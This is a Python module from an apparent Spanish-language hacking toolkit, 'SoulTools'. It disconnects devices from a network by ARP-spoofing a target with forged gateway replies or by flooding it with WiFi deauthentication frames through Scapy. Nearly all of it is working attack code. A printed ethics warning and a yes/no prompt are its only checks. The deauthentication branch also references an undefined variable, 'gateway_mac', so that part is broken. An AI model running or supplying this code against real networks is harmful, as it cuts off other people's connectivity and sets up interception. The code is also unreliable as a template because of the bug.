#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SoulTools - Módulo de Ataque de Desautenticación
Funcionalidades para interrumpir la conectividad de dispositivos en redes WiFi
Versión: 1.4
"""

import os
import sys
import time
import ipaddress
import subprocess
import re
import scapy.all as scapy
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, ARP, Ether
from modules.red import Colors, loading_animation

def is_monitor_mode(interface):
    """Verifica si la interfaz está en modo monitor (solo Linux)"""
    if os.name == 'nt':
        return False
    try:
        result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
        return 'Mode:Monitor' in result.stdout
    except:
        return False

def arp_spoof(target_ip, gateway_ip, interface, scanner, duration=30):
    """Realiza ARP spoofing para interrumpir la conectividad"""
    try:
        # Obtener MAC del dispositivo objetivo desde el escaneo previo
        target_mac = None
        for host in scanner.active_hosts:
            if host['ip'] == target_ip and host['mac'] != "No disponible":
                target_mac = host['mac']
                break
        if not target_mac:
            # Intentar con scapy.getmacbyip si no está en el escaneo
            target_mac = scapy.getmacbyip(target_ip)
        if not target_mac:
            print(f"{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}No se pudo obtener la MAC del dispositivo {target_ip}.{Colors.RESET}")
            print(f"{Colors.BRIGHT_YELLOW}[*]{Colors.RESET} {Colors.WHITE}Asegúrese de que el dispositivo está activo y aparece en el escaneo previo.{Colors.RESET}")
            return

        # Obtener MAC del router
        gateway_mac = scapy.getmacbyip(gateway_ip)
        if not gateway_mac:
            print(f"{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}No se pudo obtener la MAC del router {gateway_ip} automáticamente.{Colors.RESET}")
            print(f"{Colors.BRIGHT_YELLOW}[*]{Colors.RESET} {Colors.WHITE}Por favor, ingrese la MAC del router (e.g., 30:16:9D:24:5C:34).{Colors.RESET}")
            gateway_mac = input(f"{Colors.BRIGHT_YELLOW}MAC del router: {Colors.RESET}").strip()
            # Validar formato de MAC con expresión regular
            if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', gateway_mac):
                print(f"{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}Formato de MAC inválido: {gateway_mac}. Use formato XX:XX:XX:XX:XX:XX{Colors.RESET}")
                return

        print(f"{Colors.BRIGHT_CYAN}[*]{Colors.RESET} {Colors.WHITE}Iniciando ARP spoofing en {target_ip} ({target_mac})...{Colors.RESET}")
        print(f"{Colors.BRIGHT_CYAN}[*]{Colors.RESET} {Colors.WHITE}Router: {gateway_ip} ({gateway_mac}){Colors.RESET}")
        print(f"{Colors.BRIGHT_CYAN}[*]{Colors.RESET} {Colors.WHITE}Duración: {duration} segundos{Colors.RESET}")

        # Crear paquete ARP con trama Ethernet
        arp_response = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        start_time = time.time()
        while (time.time() - start_time) < duration:
            sendp(arp_response, iface=interface, count=10, inter=0.1, verbose=0)
            print(f"\r{Colors.BRIGHT_YELLOW}[*]{Colors.RESET} Enviando paquetes ARP...", end="", flush=True)
        print(f"\n{Colors.BRIGHT_GREEN}[✓]{Colors.RESET} {Colors.WHITE}ARP spoofing completado en {duration} segundos.{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}Error durante ARP spoofing: {e}{Colors.RESET}")
        print(f"{Colors.BRIGHT_YELLOW}[*]{Colors.RESET} {Colors.WHITE}Verifique que Scapy y Npcap (en Windows) estén instalados.{Colors.RESET}")

def get_gateway_ip():
    """Intenta obtener la IP del router usando múltiples métodos"""
    gateway_ip = None
    try:
        if os.name == 'nt':
            # Método 1: Usar ipconfig
            result = subprocess.run(['ipconfig'], capture_output=True, text=True, timeout=3)
            for line in result.stdout.split('\n'):
                if 'Default Gateway' in line and '.' in line:
                    gateway_ip = line.split()[-1].strip()
                    if gateway_ip:
                        break
            # Método 2: Usar netstat -r
            if not gateway_ip:
                result = subprocess.run(['netstat', '-r'], capture_output=True, text=True, timeout=3)
                for line in result.stdout.split('\n'):
                    if 'Gateway' in line and '.' in line:
                        parts = line.split()
                        for part in parts:
                            if part.count('.') == 3 and ipaddress.IPv4Address(part):
                                gateway_ip = part
                                break
                        if gateway_ip:
                            break
        else:
            # Método para Linux
            result = subprocess.run(['ip', 'route', 'show'], capture_output=True, text=True, timeout=3)
            for line in result.stdout.split('\n'):
                if 'default via' in line:
                    gateway_ip = line.split()[2]
                    break
        return gateway_ip
    except:
        return None

def deauth_device(target_ip, interface, scanner, duration=30):
    """Realiza un ataque de desautenticación o ARP spoofing según el sistema operativo"""
    
    # Verificar permisos de administrador
    is_admin = False
    try:
        if os.name == 'nt':  # Windows
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        else:  # Linux/Mac
            is_admin = os.geteuid() == 0
    except:
        is_admin = False
    
    if not is_admin:
        print(f"{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}Este módulo requiere permisos de administrador. Ejecute con sudo o como administrador.{Colors.RESET}")
        return
    
    # Advertencia ética
    print(f"\n{Colors.BRIGHT_RED}╔═══════════════════════════════════════════════════════╗")
    print(f"║                     ADVERTENCIA ÉTICA                 ║")
    print(f"║ Este módulo interrumpe la conectividad de dispositivos.║")
    print(f"║ Solo úselo en redes propias con permiso explícito.    ║")
    print(f"║ El uso no autorizado puede ser ilegal.                ║")
    print(f"╚═══════════════════════════════════════════════════════╝{Colors.RESET}")
    confirm = input(f"{Colors.BRIGHT_YELLOW}¿Confirmar interrupción de conectividad? (s/N): {Colors.RESET}").lower()
    if confirm not in ['s', 'si', 'y', 'yes']:
        print(f"{Colors.BRIGHT_CYAN}[*]{Colors.RESET} {Colors.WHITE}Acción cancelada.{Colors.RESET}")
        return
    
    # Validar la IP
    try:
        ipaddress.IPv4Address(target_ip)
    except ValueError:
        print(f"{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}Formato de IP inválido: {target_ip}{Colors.RESET}")
        return
    
    # Obtener la MAC del dispositivo desde los resultados del escáner
    target_mac = None
    for host in scanner.active_hosts:
        if host['ip'] == target_ip and host['mac'] != "No disponible":
            target_mac = host['mac']
            break
    
    if not target_mac:
        print(f"{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}No se encontró una MAC válida para la IP {target_ip} en el escaneo.{Colors.RESET}")
        print(f"{Colors.BRIGHT_YELLOW}[*]{Colors.RESET} {Colors.WHITE}Asegúrese de que el dispositivo esté en los resultados del escaneo.{Colors.RESET}")
        return
    
    # Obtener la IP del router
    gateway_ip = get_gateway_ip()
    if not gateway_ip:
        print(f"{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}No se pudo obtener la IP del router automáticamente.{Colors.RESET}")
        print(f"{Colors.BRIGHT_YELLOW}[*]{Colors.RESET} {Colors.WHITE}Por favor, ingrese la IP del router (e.g., 192.168.68.1).{Colors.RESET}")
        gateway_ip = input(f"{Colors.BRIGHT_YELLOW}IP del router: {Colors.RESET}").strip()
        try:
            ipaddress.IPv4Address(gateway_ip)
        except ValueError:
            print(f"{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}Formato de IP inválido para el router: {gateway_ip}{Colors.RESET}")
            return
    
    # Verificar si la interfaz es válida
    try:
        if os.name == 'nt':
            result = subprocess.run(['ipconfig'], capture_output=True, text=True, timeout=3)
            if interface not in result.stdout:
                print(f"{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}Interfaz {interface} no encontrada.{Colors.RESET}")
                print(f"{Colors.BRIGHT_YELLOW}[*]{Colors.RESET} {Colors.WHITE}Ejecute 'ipconfig' para verificar el nombre de la interfaz (e.g., Ethernet, Wi-Fi).{Colors.RESET}")
                return
        else:
            result = subprocess.run(['ip', 'link', 'show', interface], capture_output=True, text=True, timeout=3)
            if result.returncode != 0:
                print(f"{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}Interfaz {interface} no encontrada.{Colors.RESET}")
                print(f"{Colors.BRIGHT_YELLOW}[*]{Colors.RESET} {Colors.WHITE}Ejecute 'ip link show' para verificar el nombre de la interfaz (e.g., wlan0).{Colors.RESET}")
                return
    except:
        print(f"{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}Error al verificar la interfaz {interface}.{Colors.RESET}")
        return
    
    # Determinar el tipo de ataque según el sistema operativo
    if os.name == 'nt' or not is_monitor_mode(interface):
        # Usar ARP spoofing en Windows o si no está en modo monitor
        print(f"{Colors.BRIGHT_CYAN}[*]{Colors.RESET} {Colors.WHITE}Usando ARP spoofing (modo compatible con Windows o sin modo monitor).{Colors.RESET}")
        arp_spoof(target_ip, gateway_ip, interface, scanner, duration)
    else:
        # Usar ataque de desautenticación en Linux con modo monitor
        print(f"{Colors.BRIGHT_CYAN}[*]{Colors.RESET} {Colors.WHITE}Iniciando ataque de desautenticación en {target_ip} ({target_mac})...{Colors.RESET}")
        print(f"{Colors.BRIGHT_CYAN}[*]{Colors.RESET} {Colors.WHITE}Router: {gateway_ip} ({gateway_mac}){Colors.RESET}")
        print(f"{Colors.BRIGHT_CYAN}[*]{Colors.RESET} {Colors.WHITE}Duración: {duration} segundos{Colors.RESET}")
        
        try:
            packet = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth(reason=7)
            start_time = time.time()
            while (time.time() - start_time) < duration:
                sendp(packet, iface=interface, count=10, inter=0.1, verbose=0)
                print(f"\r{Colors.BRIGHT_YELLOW}[*]{Colors.RESET} Enviando paquetes de desautenticación...", end="", flush=True)
            print(f"\n{Colors.BRIGHT_GREEN}[✓]{Colors.RESET} {Colors.WHITE}Ataque completado en {duration} segundos.{Colors.RESET}")
        except Exception as e:
            print(f"\n{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}Error durante el ataque: {e}{Colors.RESET}")
            print(f"{Colors.BRIGHT_YELLOW}[*]{Colors.RESET} {Colors.WHITE}Verifique que Scapy esté instalado y que la interfaz esté en modo monitor.{Colors.RESET}")